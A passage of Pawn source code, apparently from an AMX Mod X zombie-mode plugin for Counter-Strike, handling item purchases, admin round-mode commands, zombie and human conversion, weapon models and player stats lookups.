					if (g_iRoundsCount > 2 && !g_iRounds[g_iRoundsCount] && !g_iRounds[g_iRoundsCount + -1] && g_bRoundStart)
					{
						g_bRoundStart = false;
						remove_task(550, 0);
						StartAssassinMode(iPlayer);
						remove_task(700, 0);
						g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
						set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
						ShowSyncHudMsg(0, g_iEventsHudmessage, "%s bought Assassin!", g_cName[iPlayer]);
						client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 bought^4 Assassin", g_cName[iPlayer]);
						copy(g_cModeRecordings[g_iModeRecordings], 32, g_cName[iPlayer]);
						g_iModeRecordings += 1;
					}
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Sorry but you can't buy right now...");
				}
			}
			case 24:
			{
				if (g_iExtraItemsPrices[iChoice] > g_iPacks[iPlayer])
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 You don't have enough ammo packs!");
					return 0;
				}
				if ((g_iExtraItemsTeams[iChoice] == 1 && !g_bZombie[iPlayer]) || (g_bZombie[iPlayer] && g_iExtraItemsTeams[iChoice] == 2))
				{
					client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 This item is not for your team!");
					return 0;
				}
				g_iBlinks[iPlayer] += 5;
				g_iPacks[iPlayer] -= g_iExtraItemsPrices[iChoice];
				set_hudmessage(205, 102, 29, -1.00, 0.70, 1, 0.00, 3.00, 2.00, 1.00, -1);
				ShowSyncHudMsg(0, g_iEventsHudmessage, "%s bought Knife Blinks!", g_cName[iPlayer]);
			}
			default:
			{
			}
		}
	}
	return 0;
}

public CmdMode(iPlayer)
{
	static Float:fGameTime;
	static iAmmoTarget;
	static cAmmo[4];
	static iAlive;
	static iTarget;
	static cTarget[32];
	static cMode[32];
	static iAmmo;
	read_argv(0, cMode, 32);
	read_argv(1, cTarget, 31);
	read_argv(2, cAmmo, 4);
	iAlive = GetAliveCount();
	iAmmo = clamp(str_to_num(cAmmo), 0, 999999);
	iTarget = cmd_target(iPlayer, cTarget, (CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF))
	fGameTime = get_gametime();
	if (fGameTime - g_fRoundStartTime < 2.0)		
	{
		client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Please wait at least^4 two seconds^1 after round started!");
		console_print(iPlayer, "[Zombie Outstanding] Please wait at least two seconds after round started!");
	}
	if (get_user_flags ( iPlayer ) & read_flags ( "a" ) && equal(cMode, "amx_ammo") && iTarget && !g_bGaveThisRound[iPlayer] && g_iRoundsCount > 3)
    {
		client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^1 %s^1: give^3 %d^1 ammopacks to^4 %s^1", g_cName[iPlayer], iAmmo, g_cName[iTarget]);
		g_iPacks[iPlayer] += iAmmo;
    }
	if (get_user_flags ( iPlayer ) & read_flags ( "h" ) && equal(cMode, "amx_human") && iTarget && !g_bRoundStart && iAlive > 2 && GetHumans() && GetZombies() > 1 && !g_bRoundEnd && !g_iRoundType && g_iRoundsCount > 3)
	{
		if (!g_iPlayerType[iTarget] && !g_bZombie[iTarget])
		{
			return 0;
		}
		MakeHuman(iTarget, false, false);
		client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 made^3 %s^1 a^4 Human", g_cName[iPlayer], g_cName[iTarget]);
		log_to_file("ZombieOutstanding.log", "%s made %s a Human", g_cName[iPlayer], g_cName[iTarget]);
	}
	if (get_user_flags ( iPlayer ) & read_flags ( "6" ) && equal(cMode, "amx_respawn") && iAmmoTarget && !g_bAlive[iAmmoTarget] && !g_bRoundStart && iAlive > 1 && GetAliveCount() && GetHumans() && GetZombies() && !g_iRoundType && !g_bRoundEnd && g_iRoundsCount > 3)
	{
		ExecuteHamB(Ham_CS_RoundRespawn, iAmmoTarget);
		client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 respawn^3 %s", g_cName[iPlayer], g_cName[iAmmoTarget]);
		log_to_file("ZombieOutstanding.log", "%s respawn %s", g_cName[iPlayer], g_cName[iAmmoTarget]);
	}
	if (get_user_flags ( iPlayer ) & read_flags ( "z" ) && equal(cMode, "amx_zombie") && iTarget && iAlive > 2 && GetHumans() > 1 && GetZombies() && !g_bRoundEnd && !g_iRoundType && g_iRoundsCount > 3)
	{
		if (g_bZombie[iTarget] && !g_iPlayerType[iTarget])
		{
			return 0;
		}
		if (g_bRoundStart)
		{
			StartNormalMode(iTarget);
			remove_task(700, 0);
			g_bRoundStart = false;
			remove_task(550, 0);
			client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 made^3 %s^1 a^4 Zombie^1 [^4 First Zombie^1 ]", g_cName[iPlayer], g_cName[iTarget]);
			log_to_file("ZombieOutstanding.log", "%s made %s a Zombie [First Zombie]", g_cName[iPlayer], g_cName[iTarget]);
		}
		else
		{
			MakeZombie(0, iTarget, false, false, false);
			client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 made^3 %s^1 a^4 Zombie", g_cName[iPlayer], g_cName[iTarget]);
			log_to_file("ZombieOutstanding.log", "%s made %s a Zombie", g_cName[iPlayer], g_cName[iTarget]);
		}
	}
	if (equal(cMode, "amx_sniper") && iTarget && g_bRoundStart && get_user_flags ( iPlayer ) & read_flags ( "x" ) && g_iRoundsCount > 3)
	{
		StartSniperMode(iTarget);
		remove_task(700, 0);
		g_bRoundStart = false;
		remove_task(550, 0);
		client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 made^3 %s^1 a^4 Sniper", g_cName[iPlayer], g_cName[iTarget]);
		log_to_file("ZombieOutstanding.log", "%s made %s a Sniper", g_cName[iPlayer], g_cName[iTarget]);
	}
	if (equal(cMode, "amx_survivor") && iTarget && g_bRoundStart && get_user_flags ( iPlayer ) & read_flags ( "v" ) && g_iRoundsCount > 3)
	{
		StartSurvivorMode(iTarget);
		remove_task(700, 0);
		g_bRoundStart = false;
		remove_task(550, 0);
		client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 made^3 %s^1 a^4 Survivor", g_cName[iPlayer], g_cName[iTarget]);
		log_to_file("ZombieOutstanding.log", "%s made %s a Survivor", g_cName[iPlayer], g_cName[iTarget]);
	}
	if (equal(cMode, "amx_nemesis") && iTarget && g_bRoundStart && get_user_flags ( iPlayer ) & read_flags ( "n" ) && g_iRoundsCount > 3)
	{
		StartNemesisMode(iTarget);
		remove_task(700, 0);
		g_bRoundStart = false;
		remove_task(550, 0);
		client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 made^3 %s^1 a^4 Nemesis", g_cName[iPlayer], g_cName[iTarget]);
		log_to_file("ZombieOutstanding.log", "%s made %s a Nemesis", g_cName[iPlayer], g_cName[iTarget]);
	}
	if (equal(cMode, "amx_assassin") && iTarget && g_bRoundStart && get_user_flags ( iPlayer ) & read_flags ( "b" ) && g_iRoundsCount > 3)
	{
		StartAssassinMode(iTarget);
		remove_task(700, 0);
		g_bRoundStart = false;
		remove_task(550, 0);
		client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 made^3 %s^1 an^4 Assassin", g_cName[iPlayer], g_cName[iTarget]);
		log_to_file("ZombieOutstanding.log", "%s made %s an Assassin", g_cName[iPlayer], g_cName[iTarget]);
	}
	if (equal(cMode, "amx_swarm") && g_bRoundStart && get_user_flags ( iPlayer ) & read_flags ( "s" ) && iAlive > 9 && g_iLastMode != 64 && g_iRoundsCount > 3)
	{
		StartSwarmMode(true);
		remove_task(700, 0);
		g_bRoundStart = false;
		remove_task(550, 0);
		client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 started^4 Swarm^1 round!", g_cName[iPlayer]);
		log_to_file("ZombieOutstanding.log", "%s started Swarm round", g_cName[iPlayer]);
	}
	if (equal(cMode, "amx_plague") && g_bRoundStart && get_user_flags ( iPlayer ) & read_flags ( "p" ) && iAlive > 9 && g_iLastMode != 32 && g_iRoundsCount > 3)
	{
		StartPlagueMode(true);
		remove_task(700, 0);
		g_bRoundStart = false;
		remove_task(550, 0);
		client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 started^4 Plague^1 round!", g_cName[iPlayer]);
		log_to_file("ZombieOutstanding.log", "%s started Plague round", g_cName[iPlayer]);
	}
	if (equal(cMode, "amx_armageddon") && g_bRoundStart && get_user_flags ( iPlayer ) & read_flags ( "j" ) && iAlive > 9 && g_iLastMode != 128 && g_iRoundsCount > 3)
	{
		StartArmageddonMode(true);
		remove_task(700, 0);
		g_bRoundStart = false;
		remove_task(550, 0);
		client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 started^4 Armageddon^1 round!", g_cName[iPlayer]);
		log_to_file("ZombieOutstanding.log", "%s started Armageddon round", g_cName[iPlayer]);
	}
	if (equal(cMode, "amx_nightmare") && g_bRoundStart && get_user_flags ( iPlayer ) & read_flags ( "2" ) && iAlive > 9 && g_iLastMode != 256 && g_iRoundsCount > 3)
	{
		StartNightmareMode(true);
		remove_task(700, 0);
		g_bRoundStart = false;
		remove_task(550, 0);
		client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 started^4 Nightmare^1 round!", g_cName[iPlayer]);
		log_to_file("ZombieOutstanding.log", "%s started Nightmare round", g_cName[iPlayer]);
	}
	if (equal(cMode, "amx_assassins_vs_snipers") && g_bRoundStart && get_user_flags ( iPlayer ) & read_flags ( "9" ) && iAlive > 9 && g_iLastMode != 512 && g_iRoundsCount > 3)
	{
		StartAssassinsVsSnipersMode(true);
		remove_task(700, 0);
		g_bRoundStart = false;
		remove_task(550, 0);
		client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 started^4 Assassins vs Snipers^1 round!", g_cName[iPlayer]);
		log_to_file("ZombieOutstanding.log", "%s started Assassins vs Snipers round", g_cName[iPlayer]);
	}
	if (equal(cMode, "amx_multiple") && g_bRoundStart && get_user_flags ( iPlayer ) & read_flags ( "0" ) && iAlive > 9 && g_iLastMode != 16 && g_iRoundsCount > 3)
	{
		StartMultiMode(true);
		remove_task(700, 0);
		g_bRoundStart = false;
		remove_task(550, 0);
		client_print_color(0, print_team_grey, "^4[Zombie Outstanding]^3 %s^1 started^4 Multiple Infections^1 round!", g_cName[iPlayer]);
		log_to_file("ZombieOutstanding.log", "%s started Multiple Infections round", g_cName[iPlayer]);
	}
	return 0;
}

CheckLastPlayer(iPlayer)
{
	if (g_bRoundEnd || task_exists(550, 0))
	{
		return 0;
	}
	static i;
	static iPlayersNum;
	iPlayersNum = GetAliveCount();
	if (iPlayersNum < 2)
	{
		return 0;
	}
	if (g_bZombie[iPlayer] && GetZombies() == 1)
	{
		if (GetHumans() == 1 && GetCTs() == 1)
		{
			return 0;
		}
		do {
		} while (iPlayer == (i = GetRandomAlive()));
		client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Last zombie,^3 %s^1 disconnected,^4 %s^1 is the last zombie!", g_cName[iPlayer], g_cName[i]);
		if (g_iPlayerType[iPlayer] & 1)
		{
			MakeZombie(0, i, false, true, false);
			set_user_health(i, get_user_health(iPlayer));
		}
		else
		{
			if (g_iPlayerType[iPlayer] & 2)
			{
				MakeZombie(0, i, false, false, true);
				set_user_health(i, get_user_health(iPlayer));
			}
			MakeZombie(0, i, false, false, false);
		}
	}
	else
	{
		if (!g_bZombie[iPlayer] && GetHumans() == 1)
		{
			if (GetZombies() == 1 && GetTs() == 1)
			{
				return 0;
			}
			do {
			} while (iPlayer == (i = GetRandomAlive()));
			client_print_color(iPlayer, print_team_grey, "^4[Zombie Outstanding]^1 Last human,^3 %s^1 disconnected,^4 %s^1 is the last human!", g_cName[iPlayer], g_cName[i]);
			if (g_iPlayerType[iPlayer] & 4)
			{
				MakeHuman(i, true, false);
				set_user_health(i, get_user_health(iPlayer));
			}
			if (g_iPlayerType[iPlayer] & 8)
			{
				MakeHuman(i, false, true);
				set_user_health(i, get_user_health(iPlayer));
			}
			MakeHuman(i, false, false);
		}
	}
	return 0;
}

public EventCurWeapon(iPlayer)
{
    g_iWeapon[iPlayer] = read_data(2);
    if (g_bZombie[iPlayer])
    {
        switch (g_iWeapon[iPlayer])
        {
            case CSW_HEGRENADE:
            {
                set_pev(iPlayer, pev_viewmodel2, "models/ZombieOutstanding/z_out_v_grenade_infection.mdl");
                set_pev(iPlayer, pev_weaponmodel2, "models/ZombieOutstanding/z_out_p_grenade_infection.mdl");
            }
            case CSW_KNIFE:
            {
                if (!g_iPlayerType[iPlayer])
                {
                    set_pev(iPlayer, pev_viewmodel2, g_cZombieClaws[g_iZombieClass[iPlayer]]);
                }
                else
                {
                    if (g_iPlayerType[iPlayer] & 1)
                    {
                        set_pev(iPlayer, pev_viewmodel2, "models/ZombieOutstanding/z_out_nemesis_claws.mdl");
                    }
                    if (g_iPlayerType[iPlayer] & 2)
                    {
                        set_pev(iPlayer, pev_viewmodel2, "models/ZombieOutstanding/z_out_assassin_claws.mdl");
                    }
                }
                set_pev(iPlayer, pev_weaponmodel2, "");
            }
            default:
            {
            }
        }
    }
    else
    {
		if (get_user_jetpack(iPlayer) && g_iWeapon[iPlayer] == CSW_KNIFE)
		{
			entity_set_string(iPlayer,EV_SZ_viewmodel, "models/v_egon.mdl" );
			entity_set_string(iPlayer,EV_SZ_weaponmodel, "models/p_egon.mdl" );
		}
		else
		{
					
            if (g_iPlayerType[iPlayer] & 8 && g_iWeapon[iPlayer] == CSW_AWP)
            {
				set_pev(iPlayer, pev_viewmodel2, "models/ZombieOutstanding/z_out_v_awp_sniper.mdl");
				set_pev(iPlayer, pev_weaponmodel2, "models/ZombieOutstanding/z_out_p_awp_sniper.mdl");
            }
            if (g_bGolden[iPlayer] && g_iWeapon[iPlayer] == CSW_AK47)
            {
				set_pev(iPlayer, pev_viewmodel2, "models/ZombieOutstanding/v_golden_ak47.mdl");
				set_pev(iPlayer, pev_weaponmodel2, "models/ZombieOutstanding/p_golden_ak47.mdl");
            }
            if (g_bGoldenDeagle[iPlayer] && g_iWeapon[iPlayer] == CSW_DEAGLE)
            {
				set_pev(iPlayer, pev_viewmodel2, "models/ZombieOutstanding/v_golden_deagle.mdl");
				set_pev(iPlayer, pev_weaponmodel2, "models/ZombieOutstanding/p_golden_deagle.mdl");
            }
		}		
    }
    return 0;
}

public UpdateWeapon(iPlayer)
{
	g_iWeapon[iPlayer] = read_data(2);
	return 0;
}

public message_cur_weapon(msg_id, msg_dest, msg_entity)
{
	if (!g_bUnlimitedClip[msg_entity])
		return;
	
	if (!is_user_alive(msg_entity) || get_msg_arg_int(1) != 1)
		return;
	
	static weapon, clip
	weapon = get_msg_arg_int(2)
	clip = get_msg_arg_int(3)
	
	if (MAXCLIP[weapon] > 2)
	{
		set_msg_arg_int(3, get_msg_argtype(3), MAXCLIP[weapon]) 
		
		if (clip < 2) 
		{
			static wname[32], weapon_ent
			get_weaponname(weapon, wname, sizeof wname - 1)
			weapon_ent = fm_find_ent_by_owner(-1, wname, msg_entity)
			
			fm_set_weapon_ammo(weapon_ent, MAXCLIP[weapon])
		}
	}
}

GetCTs()
{
	static iCount;
	static i;
	iCount = 0;
	i = 1;
	while (g_iMaxClients + 1 > i)
	{
		if (g_bConnected[i] && fm_cs_get_user_team(i) == FM_CS_TEAM_CT)
		{
			iCount += 1;
		}
		i += 1;
	}
	return iCount;
}

GetTs()
{
	static iCount;
	static i;
	iCount = 0;
	i = 1;
	while (g_iMaxClients + 1 > i)
	{
		if (g_bConnected[i] && fm_cs_get_user_team(i) == FM_CS_TEAM_T)
		{
			iCount += 1;
		}
		i += 1;
	}
	return iCount;
}

GetAliveCount()
{
	static iCount;
	static i;
	iCount = 0;
	i = 1;
	while (g_iMaxClients + 1 > i)
	{
		if (g_bAlive[i])
		{
			iCount += 1;
		}
		i += 1;
	}
	return iCount;
}

GetRandomAlive()
{
	static j;
	static i;
	static iPlayers[32];
	j = 0;
	i = 1;
	while (g_iMaxClients + 1 > i)
	{
		if (g_bAlive[i])
		{
			iPlayers[j] = i;
			j += 1;
		}
		i += 1;
	}
	return iPlayers[random_num(0, j + -1)];
}

GetZombies()
{
	static iNum;
	static i;
	iNum = 0;
	i = 1;
	while (g_iMaxClients + 1 > i)
	{
		if (g_bAlive[i] && g_bZombie[i])
		{
			iNum += 1;
		}
		i += 1;
	}
	return iNum;
}

GetHumans()
{
	static iNum;
	static i;
	iNum = 0;
	i = 1;
	while (g_iMaxClients + 1 > i)
	{
		if (g_bAlive[i] && !g_bZombie[i])
		{
			iNum += 1;
		}
		i += 1;
	}
	return iNum;
}

public client_infochanged(iPlayer)
{
    if (!g_bConnected[iPlayer])
    {
        return 0;
    }
    static cName[32];
    static Name[64] = { 0, ... }, queryData[32] = { 0, ... }, Float:finalChange[33] = { 0.0, ... }, Float:gameTime = 0.0;
	static newn[64], oldn[64]
	get_user_name(iPlayer,oldn,63)
	get_user_info(iPlayer,"name",newn,63)
	if(!equali(oldn,newn)&&strlen(newn)>0)
	{
		new vlt=nvault_open("points")
		if (vlt != -1)
		{
			g_iPoints[iPlayer]=nvault_get(vlt,newn)
			nvault_close(vlt)
			vlt=-1
		}
	}	
    get_user_info(iPlayer, "name", cName, 31);
    if (!equal(g_cName[iPlayer], cName, 0))
    {
        copy(g_cName[iPlayer], 31, cName);
    }
    if (is_user_connected(iPlayer) == 1 && is_user_bot(iPlayer) == 0 && is_user_hltv(iPlayer) == 0)
    {
		get_user_info(iPlayer, "name", Name, charsmax(Name));

		replace_all(Name, charsmax(Name), "`", "*");
		replace_all(Name, charsmax(Name), "'", "*");
		replace_all(Name, charsmax(Name), "\", "*");

		if (equali(Name, g_Name[iPlayer]) == 0)
		{
			resetPlayer(iPlayer);

			gameTime = get_gametime();

			if (gameTime < finalChange[iPlayer])
			{
				server_cmd("kick #%d  Stop changing your name so fast!", get_user_userid(iPlayer));
			}

			else
			{
				finalChange[iPlayer] = gameTime + 7.5;

				num_to_str(iPlayer, queryData, charsmax(queryData));

				formatex(g_Name[iPlayer], charsmax(g_Name[]), "%s", Name);

				get_user_authid(iPlayer, g_Steam[iPlayer], charsmax(g_Steam[]));
				get_user_ip(iPlayer, g_Ip[iPlayer], charsmax(g_Ip[]), 1);
				
				formatex(g_Query, charsmax(g_Query), "SELECT Score, Kills, Deaths, headShots, \
				Time, timeString, Seen, seenString, kpdRatio, kmdValue FROM Players WHERE Name = '%s';", \
				g_Name[iPlayer]);

				SQL_ThreadQuery(g_Tuple, "retrieveOrCreatePlayer", g_Query, queryData, sizeof(queryData));
			}
		}
    }
    set_task(5.0, "TaskCheckName", iPlayer, "", 0, "", 0);	
    return 0;
}


MakeZombie(iAttacker, iVictim, bool:bSilent, bool:bNemesis, bool:bAssassin)
{
	if (g_iZombieNextClass[iVictim] == -1)
	{
		set_task(0.20, "ShowMenuClasses", iVictim, "", 0, "", 0);
	}
	g_iZombieClass[iVictim] = g_iZombieNextClass[iVictim];
	if (g_iZombieClass[iVictim] == -1)
	{
		g_iZombieClass[iVictim] = 0;
	}
	if (get_user_jetpack(iVictim))
	{
		user_drop_jetpack(iVictim);
	}
	set_pev(iVictim, pev_effects, pev(iVictim, pev_effects) &~ EF_BRIGHTLIGHT)
	set_pev(iVictim, pev_effects, pev(iVictim, pev_effects) &~ EF_NODRAW)
	g_bFlash[iVictim] = true;
	g_bFlashEnabled[iVictim] = true;	
	g_bZombie[iVictim] = true;
	g_bNoDamage[iVictim] = false;
	g_iBurningDuration[iVictim] = 0;
	g_iPlayerType[iVictim] = 0;
	g_cClass[iVictim] = g_cZombieClasses[g_iZombieClass[iVictim]];
        set_user_rendering( iVictim, kRenderFxNone, 0, 0, 0, kRenderNormal, 0 );
	remove_task(iVictim + 200, 0);
	remove_task(iVictim + 250, 0);
	if (iAttacker)
	{
        SendDeathMsg ( iAttacker, iVictim );
        FixDeadAttrib ( iVictim );
        UpdateFrags ( iAttacker, iVictim, 1, 1, 1 );		
        g_iPacks[iAttacker]++;
        if (g_iZombieClass[iAttacker] == 6)
        {
            set_user_health(iAttacker, get_user_health(iAttacker) + 250);
            set_user_rendering( iAttacker, kRenderFxGlowShell, 255, 10, 10, kRenderNormal, 0 );
            set_user_footsteps( iAttacker, 1 );
            message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("ScreenFade"), _, iAttacker)
            write_short(4096)
            write_short(2048)
            write_short(0)
            write_byte(255)
            write_byte(0)
            write_byte(0)
            write_byte(255)
            message_end()	
            set_task(3.00, "TaskRemoveRender", iAttacker, "", 0, "", 0);
            set_hudmessage(0, 255, 0, -1.00, 0.10, 1, 0.00, 1.75, 1.00, 1.00, -1);
            ShowSyncHudMsg(iAttacker, g_iRegenerationSync, "== HUNTER ==^n!!!Regeneration: +250 HP Gained!!!");
        }
	}	
	if (!bSilent)
	{
		if (bNemesis)
		{
			g_iPlayerType[iVictim] |= 1;
			set_user_health(iVictim, 150000);
			g_cClass[iVictim] = "Nemesis"
		}
		else if (bAssassin)
		{
			g_iPlayerType[iVictim] |= 2;
			set_user_health(iVictim, 17500);
			g_cClass[iVictim] = "Assassin"
		}
		else if (GetZombies() == 1 && !g_iPlayerType[iVictim])
		{
			set_user_health(iVictim, 10500);
			EmitSound(iVictim, CHAN_AUTO, g_cZombieInfectSounds[random_num(0, 4)]);
		}
		else
		{
			set_user_health(iVictim, g_iZombieHealths[g_iZombieClass[iVictim]]);
			EmitSound(iVictim, CHAN_AUTO, g_cZombieInfectSounds[random_num(0, 4)]);
			set_hudmessage(255, 0, 0, 0.05, 0.45, 0, 0.00, 5.00, 1.00, 1.00, -1);
			if (iAttacker)
			ShowSyncHudMsg(0, g_iAntidoteSync, "%s's brains have been eaten by %s...", g_cName[iVictim], g_cName[iAttacker]);
			else 
			ShowSyncHudMsg(0, g_iAntidoteSync, "%s's brains have been eaten...", g_cName[iVictim]);	
		}
	}
	else
	{
		set_user_health(iVictim, g_iZombieHealths[g_iZombieClass[iVictim]]);
	}	
	if (fm_cs_get_user_team(iVictim) != FM_CS_TEAM_T)
	{
		remove_task ( iVictim + TASK_TEAM );
		fm_cs_set_user_team ( iVictim, FM_CS_TEAM_T);
		fm_user_team_update ( iVictim );
	}
	if (g_iPlayerType[iVictim] & 1)
	{
		fm_set_rendering (iVictim, kRenderFxGlowShell, 255, 0, 0, kRenderNormal, 25);
	}	
	static Float:fCurrentTime;
	fCurrentTime = get_gametime();
	if (floatsub(fCurrentTime, g_fLastChangedModel) >= 0.25)
	{
		ChangeModel(iVictim + 250);
		g_fLastChangedModel = fCurrentTime;
	}
	else
	{
		set_task(floatsub(floatadd(0.25, g_fLastChangedModel), fCurrentTime), "ChangeModel", iVictim + 250, "", 0, "", 0);
		g_fLastChangedModel = floatadd(0.25, g_fLastChangedModel);
	}		
	cs_set_user_zoom(iVictim, CS_RESET_ZOOM, 1);
	set_pev (iVictim, pev_armorvalue, 0.0);	
	drop_weapons ( iVictim, 1 );
	drop_weapons ( iVictim, 2 );	
	strip_user_weapons(iVictim);
	give_item(iVictim, "weapon_knife");
	ExecuteHamB(Ham_Item_PreFrame, iVictim);
	InfectionEffects ( iVictim );
	set_task(0.10, "TaskFlash", iVictim + 350, "", 0, "b", 0);
	return 0;
}

MakeHuman(iPlayer, bool:bSurvivor, bool:bSniper)
{
	remove_task(iPlayer + 250, 0);
	remove_task(iPlayer + 200, 0);
	remove_task(iPlayer + 350, 0);
	g_bZombie[iPlayer] = false;
	g_bFlashEnabled[iPlayer] = false;
	g_bFlash[iPlayer] = false;	
	g_bNoDamage[iPlayer] = false;
	g_bFrozen[iPlayer] = false;
	g_iBurningDuration[iPlayer] = 0;
	drop_weapons ( iPlayer, 1 );
	drop_weapons ( iPlayer, 2 );	
	g_iPlayerType[iPlayer] = 0;
	g_cClass[iPlayer] = "Human";
	give_item(iPlayer, "weapon_knife");
	strip_user_weapons(iPlayer);
	
	if (bSurvivor)
	{
		g_iPlayerType[iPlayer] |= 4;
		g_cClass[iPlayer] = "Survivor";
		set_user_health(iPlayer, 3000);
		give_item(iPlayer, "weapon_ak47");
		cs_set_user_bpammo(iPlayer, 28, 9999);
		give_item(iPlayer, "weapon_xm1014");
		cs_set_user_bpammo(iPlayer, 5, 9999);
                give_item(iPlayer, "weapon_knife");
		g_bUnlimitedClip[iPlayer] = 1;
		if (!user_has_weapon(iPlayer, 4, -1))
		{
			give_item(iPlayer, "weapon_hegrenade");
		}
	}
	else if (bSniper)
	{
		g_iPlayerType[iPlayer] |= 8;
		g_cClass[iPlayer] = "Sniper";
		set_user_health(iPlayer, 2500);
		give_item(iPlayer, "weapon_awp");
		cs_set_user_bpammo(iPlayer, 18, 9999);
                give_item(iPlayer, "weapon_knife");
		g_bUnlimitedClip[iPlayer] = 1;
	}
	else
	{	
		set_user_health(iPlayer, 150);
		give_item(iPlayer, "weapon_knife");
		menu_display(iPlayer, g_iSecondaryMenu, 0);
		client_cmd(iPlayer, "spk ZombieOutstanding/antidote");
		set_hudmessage(10, 255, 235, 0.05, 0.45, 1, 0.00, 5.00, 1.00, 1.00, -1);
		ShowSyncHudMsg(iPlayer, g_iAntidoteSync, "%s has used an antidote!", g_cName[iPlayer]);
	}
	if (fm_cs_get_user_team(iPlayer) != FM_CS_TEAM_CT)
	{
		remove_task (iPlayer + TASK_TEAM);
		fm_cs_set_user_team (iPlayer, FM_CS_TEAM_CT);
		fm_user_team_update (iPlayer);
	}
	static Float:fCurrentTime;
	fCurrentTime = get_gametime();
	if (floatsub(fCurrentTime, g_fLastChangedModel) >= 0.25)
	{
		ChangeModel(iPlayer + 250);
		g_fLastChangedModel = fCurrentTime;
	}
	else
	{
		set_task(floatsub(floatadd(0.25, g_fLastChangedModel), fCurrentTime), "ChangeModel", iPlayer + 250, "", 0, "", 0);
		g_fLastChangedModel = floatadd(0.25, g_fLastChangedModel);
	}		
	ExecuteHamB(Ham_Item_PreFrame, iPlayer);
	return 0;
}

public MessageScenario()
{
	if (get_msg_args() > 1)
	{
		new cSprite[8];
		get_msg_arg_string(2, cSprite, charsmax(cSprite));
		if (equal(cSprite, "hostage"))
		{
			return 1;
		}
	}
	return 0;
}
public MessageHostagepos()
{
	return 1;
}

AddCommas ( iNum , szOutput[] , iLen )
{
    new szTmp [17] , iOutputPos , iNumPos , iNumLen;

    iNumLen = num_to_str( iNum , szTmp , charsmax( szTmp ) );
    
    if ( iNumLen <= 3 )
    {
        iOutputPos += copy ( szOutput [iOutputPos] , iLen , szTmp );
    }
    else
    {
        while ( ( iNumPos < iNumLen ) && ( iOutputPos < iLen ) ) 
        {
            szOutput[ iOutputPos++ ] = szTmp[ iNumPos++ ];
            
            if ( ( iNumLen - iNumPos ) && !( ( iNumLen - iNumPos ) % 3 ) ) 

            szOutput[ iOutputPos++ ] = ',';
        }
            
        szOutput[ iOutputPos ] = EOS;
    }
    return iOutputPos;
}

public MessageHealth(iMessage, iDestination, iEntity)
{
	static iHealth;
	iHealth = get_msg_arg_int(1);
	if (iHealth > 255)
	{
		if (!(iHealth % 256))
		{
			set_user_health(iEntity, get_user_health(iEntity) + 1);
		}
		set_msg_arg_int(1, get_msg_argtype(1), 255);
	}
	return 0;
}


public TaskRemoveMadness(iPlayer)
{
	set_user_rendering( iPlayer, kRenderFxNone, 0, 0, 0, kRenderNormal, 0 );
}

public MessageMoney(iMessage, iDestination, iPlayer)
{
	if (g_bConnected[iPlayer])
	{
		cs_set_user_money ( iPlayer, 0 );
	}
	return 1;
}

public CmdDrop(iPlayer)
{
	if (g_bConnected[iPlayer])
	{
		if (get_user_jetpack(iPlayer) && g_iWeapon[iPlayer] == 29)
		{
			user_drop_jetpack(iPlayer);
			return 1;
		}
		if (g_iPlayerType[iPlayer])
		{
			return 1;
		}
	}
	return 0;
}

public CmdJoinTeam(iPlayer)
{
	static curTeam; curTeam = fm_cs_get_user_team ( iPlayer );
	
	if (curTeam == FM_CS_TEAM_SPECTATOR || curTeam == FM_CS_TEAM_UNASSIGNED) 
	{
		return PLUGIN_CONTINUE;
	}	
	
	menu_display(iPlayer, g_iGameMenu, 0);
	
	return PLUGIN_HANDLED;
}

public EventStatusValue(iPlayer)
{
	if (g_bConnected[iPlayer])
	{
		static cPoints[15];
		static cPacks[15];
		static cHealth[15];
		static iVictim;
		iVictim = read_data(2);
		if (g_bZombie[iVictim] == g_bZombie[iPlayer])
		{
			AddCommas(get_user_health(iVictim), cHealth, 14);
			AddCommas(g_iPacks[iVictim], cPacks, 14);
			AddCommas(g_iPoints[iVictim], cPoints, 14);
			new color1;
			if (g_bZombie[iPlayer])
			{
				color1 = 0;
			}
			else
			{
				color1 = 255;
			}
			new color2;
			if (g_bZombie[iPlayer])
			{
				color2 = 255;
			}
			else
			{
				color2 = 0;
			}
			set_hudmessage(color2, 50, color1, -1.0, 0.60, 0, 6.0, 1.1, 0.0, 0.0, -1 );
			ShowSyncHudMsg(iPlayer, g_iCenterMessageSync, "%s^n[ Health: %s | Armor: %d | Packs: %s | Points: %s ]", g_cName[iVictim], cHealth, get_user_armor(iVictim), cPacks, cPoints);
		}
		if (g_bZombie[iVictim] && !g_bZombie[iPlayer])
		{
			AddCommas(get_user_health(iVictim), cHealth, 14);
			set_hudmessage(175, 1, 30, -1.0, 0.60, 1, 0.01, 3.0, 0.01, 0.01, -1);
			ShowSyncHudMsg(iPlayer, g_iCenterMessageSync, "%s^n[ Health: %s ]", g_cName[iVictim], cHealth);
		}
	}
	return 0;
}

public TaskAdvertisements()
{
    set_task(1.0, "TaskHudXYZ", 0, "", 0, "", 0);
    if (g_iMessage >= g_iAdvertisementsCount)
    {
        g_iMessage = 0;
